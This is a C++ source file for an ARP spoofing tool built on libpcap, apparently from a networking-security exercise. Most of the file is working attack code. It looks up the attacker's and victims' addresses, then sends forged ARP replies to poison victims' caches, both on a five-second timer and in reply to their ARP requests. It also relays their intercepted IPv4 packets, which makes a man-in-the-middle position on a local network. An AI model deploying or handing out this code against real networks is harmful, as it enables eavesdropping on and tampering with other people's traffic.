#include "arp-spoof.hpp"

/*
 * Get Attacker's local MAC address and IP address
 * get MAC address in system direstory
 * get IP address using socket and I/O control
*/
bool getMyInfo(const std::string& interface, Mac& MAC, IPv4& IP) {
    int sockfd;
    struct ifreq ifr;

    // struct initialization
    memset(&ifr, 0, sizeof(struct ifreq));

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'getMyInfo'\n";
#endif

    // Find local MAC address ==================================================
    std::ifstream iface("/sys/class/net/" + interface + "/address");
    std::string tempMAC((std::istreambuf_iterator<char>(iface)), 
                        std::istreambuf_iterator<char>());

    if(tempMAC.length() == 0) {
        std::cerr << GET_MAC_ERROR_MSG;
        return false;
    }

    MAC = Mac(tempMAC);
    // =========================================================================

    // Find Local IP address ===================================================
    // Make socket which domain is IPv4 and type is UDP
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    if(sockfd == -1) {
        std::cerr << CREATE_SOCKET_ERROR_MSG;
        return false;
    }


#ifdef DEBUG
    std::cout << "[DEBUG] Successfully open socket\n";
#endif
    // Set protocol to IPv4
    ifr.ifr_addr.sa_family = AF_INET;

    // Put interface name to ifreq
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);

    // IO control to get MAC
    if(ioctl(sockfd, SIOCGIFADDR, &ifr)) {
        std::cerr << IOCTL_ERROR_MSG;
        return false;
    }

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully process ioctl\n";
#endif
    // Only one use and deep copy, so don't have to use inet_ntop 
    IP = IPv4(inet_ntoa(((sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    // Socket close
    if(close(sockfd)) {
        std::cerr << CLOSE_ERROR_MSG;
        return false;
    }
    // =========================================================================

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully close file descriptor\n";
#endif

    return true;
}

/*
 * resolve MAC address by IP using ARP request
 * Use sendPacketARP function to send packet
 * Input  : pcap, IP, myMAC, myIP
 * Output : MAC
 * Add map to check already known MAC address
*/
bool resolveMACByIP(pcap_t* pcap, Mac& MAC, const IPv4& IP, const Mac& myMAC, const IPv4& myIP) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    static std::map<IPv4, Mac> db;
    std::map<IPv4, Mac>::iterator it;
    struct ArpHdr* ARPHeaderPtr;

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'getMACByIP'\n";
#endif

    // If there exists matching MAC, return it
    it = db.find(IP);
    if(it != db.end()) {
        MAC = it->second;
        return true;
    }

    // send ARP packet
    // *** need to send repeatedly until receiving correct reply packet(Use thread!!) ***

    std::thread sender(sendARPRequest, pcap, myMAC, myIP, IP);

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully send request packet\n";
#endif

    // receive ARP reply from gateway
    while( true ) {
        res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) continue;
		// PCAP_ERROR : When interface is down
		if (res == PCAP_ERROR or res == PCAP_ERROR_BREAK) {
			std::cout << PCAP_RECEIVE_PACKET_ERROR;
			std::cout << pcap_geterr(pcap) << std::endl;

			break;
		}
		
		if(packet == NULL) continue;

        // Receive ARP packet, so check if it is response of our request!
        ARPHeaderPtr = (struct ArpHdr*)(packet + sizeof(struct EthHdr));

        if(ArpHdr::Reply == ARPHeaderPtr->op()   and 
           myIP          == ARPHeaderPtr->tip()  and 
           myMAC         == ARPHeaderPtr->tmac() and 
           IP            == ARPHeaderPtr->sip()) {
            // signal to sender thread it is no longer need to send packet
            isEnd = true;
            break;
        }
    }

    // Deep copy from ARPHeader to MAC
    // Add [IP, MAC] pair to attackerARPTable
    db[IP] = MAC = ARPHeaderPtr->smac();

    sender.join();
    isEnd = false;

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get MAC address and join thread\n";
#endif

    return true;
}

/*
 * Send one packet using pcap
 * Use pcap_sendpacket to send packet ARP packet
*/
bool sendPacket(pcap_t* pcap, const EthArpPacket& packet) {
    if(pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket))) {
        std::cerr << SEND_PACKET_ERROR_MSG;
        std::cerr << pcap_geterr(pcap) << std::endl;
        
        return false;
    }

    return true;
}

bool sendPacket(pcap_t* pcap, const uint8_t* packet, const int packetLength) {
    if(pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(packet), packetLength)) {
        std::cerr << SEND_PACKET_ERROR_MSG;
        std::cerr << pcap_geterr(pcap) << std::endl;
        
        return false;
    }

    return true;
}

/*
 * Send ARP packet using pcap
 * send packet repeatedly until end flag turns true
*/
bool sendARPRequest(pcap_t* pcap, const Mac& myMAC, const IPv4& myIP, const IPv4& IP) {
    signal(SIGINT, SIG_DFL);

    EthArpPacket packet;

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'sendARPRequest'\n";
#endif

    ARPPacketInit(packet);
    ARPPacketSetting(packet, Mac::broadcastMac(), myMAC, myMAC, myIP, Mac::nullMac(), IP);
    packet.arp_.op_ = htons(ArpHdr::Request);

    // Send until endFlag goes true
    while(not isEnd) {
        if(not sendPacket(pcap, packet)) return false;

        if(sleep(1)) {
            std::cerr << SLEEP_ERROR_MSG;
            return false;
        }
    }

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully send packet\n";
#endif

    return true;
}

void ARPPacketInit(EthArpPacket& packet) {
    // Set Ethernet header
	packet.eth_.type_ = htons(EthHdr::Arp);

    // Set ARP Header
    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ipv4);
    packet.arp_.hln_  = Mac::SIZE;
    packet.arp_.pln_  = IPv4::SIZE;
    packet.arp_.op_   = htons(ArpHdr::Reply);
}

void ARPPacketSetting(EthArpPacket& packet, 
                      const Mac& destMAC, const Mac& sourceMAC,     // for Ethernet
                      const Mac& sendMAC, const IPv4& sendIP,       // for ARP
                      const Mac& targetMAC, const IPv4& targetIP) {
    // Set Ethernet header
    packet.eth_.dmac_ = destMAC;
	packet.eth_.smac_ = sourceMAC;

    // Set ARP Header
    packet.arp_.smac_ = sendMAC;
    packet.arp_.sip_  = htonl(sendIP);
    packet.arp_.tmac_ = targetMAC;
    packet.arp_.tip_  = htonl(targetIP); 
}

bool periodAttack(pcap_t* pcap, const Mac& myMAC, const std::vector<attackInfo>& victims) {
    std::unique_lock<std::mutex> lk(m);
    auto now = std::chrono::system_clock::now();

    EthArpPacket packet;
    ARPPacketInit(packet);

    using namespace std::chrono_literals;

    // send fake packet to all victim pairs periodically
    do {
        for(auto a : victims) {
            ARPPacketSetting(packet, a.sendMAC, myMAC, myMAC, a.targetIP, a.sendMAC, a.sendIP);
            if(not sendPacket(pcap, packet)) return false;
        }
    } while(not cv.wait_until(lk, now + 5s, [](){ return not isEnd; }));

    return true;
}

/*
 * manage packets from sender and target
*/
bool managePackets(pcap_t* pcap, const Mac& myMAC, const std::vector<attackInfo>& victims) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    struct ArpHdr* ARPHeaderPtr;
    struct EthHdr* EthHeaderPtr;
    struct IPv4Hdr* IPv4HeaderPtr;

    EthArpPacket packet4Send;
    ARPPacketInit(packet4Send);

    while(not isEnd) {
        res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) continue;
		// PCAP_ERROR : When interface is down
		if (res == PCAP_ERROR or res == PCAP_ERROR_BREAK) {
			std::cout << PCAP_RECEIVE_PACKET_ERROR;
			std::cout << pcap_geterr(pcap) << std::endl;

			break;
		}
		
		if(packet == NULL) continue;

        // There is four types of packet
        // 1. ARP_REQ from sender by broadcast
        // 2. ARP_REQ from target by broadcast
        // 3. ARP_REQ from sender by unique request
        // 4. IP packet from sender to target

        // Check whether its protocol is ARP or IP
        EthHeaderPtr = (struct EthHdr*)packet;

        for(auto victim : victims) {
            // In case of neither (1, 3) nor 2 => continue
            if((EthHeaderPtr->smac() != victim.sendMAC) and 
               (EthHeaderPtr->smac() != victim.targetMAC or EthHeaderPtr->dmac() != Mac::broadcastMac())) continue;

            switch(EthHeaderPtr->type()) {
                case EthHdr::Arp:   // Case 1, 2, 3
                    ARPHeaderPtr = (struct ArpHdr*)(packet + sizeof(struct EthHdr));
                    if((ARPHeaderPtr->tip() == victim.sendIP and ARPHeaderPtr->sip() == victim.targetIP) or // Case 2
                       (ARPHeaderPtr->sip() == victim.sendIP and ARPHeaderPtr->tip() == victim.targetIP)) { // Case 1, 3
                        // send fake ARP reply packet non-periodically
                        ARPPacketSetting(packet4Send, victim.sendMAC, myMAC, 
                                         myMAC, victim.targetIP, victim.sendMAC, victim.sendIP);
                        sendPacket(pcap, packet4Send);
                    }
                    break;
                case EthHdr::Ipv4:  // Case 4
                    // Relay received packet
                    if(EthHeaderPtr->smac() != victim.sendMAC) break;

                    IPv4HeaderPtr = (struct IPv4Hdr*)(packet + sizeof(struct EthHdr));
                    if(IPv4HeaderPtr->ip_dst == victim.targetIP) {
                        EthHeaderPtr->smac_ = myMAC;
                        EthHeaderPtr->dmac_ = victim.targetMAC;

#ifdef DEBUG
                        std::cout << "[DEBUG] Received IP packet\n";
#endif

                        sendPacket(pcap, packet, header->len);
                    }
                    break;
                default: break;
            }
        }
    }

    return true;
}

/*
 * print information of Attacker, sender, and target
*/
void printInfo(const Mac& myMAC, const IPv4& myIP, 
               const Mac& sendMAC, const IPv4& sendIP, 
               const Mac& targetMAC, const IPv4& targetIP) {
    std::cout << "========================================\n"; 
    std::cout << "========================================\n"; 
    std::cout << "[[Attacker's Info]]\n"; 
    std::cout << "[MAC] " << std::string(myMAC) << '\n';
    std::cout << "[IP]  " << std::string(myIP) << '\n';
    std::cout << "========================================\n"; 
    std::cout << "[[Sender's Info]]\n"; 
    std::cout << "[MAC] " << std::string(sendMAC) << '\n'; 
    std::cout << "[IP]  " << std::string(sendIP) << '\n'; 
    std::cout << "========================================\n"; 
    std::cout << "[[Target's Info]]\n";
    std::cout << "[MAC] " << std::string(targetMAC) << '\n'; 
    std::cout << "[IP]  " << std::string(targetIP) << '\n'; 
    std::cout << "========================================\n";
    std::cout << "========================================\n";
}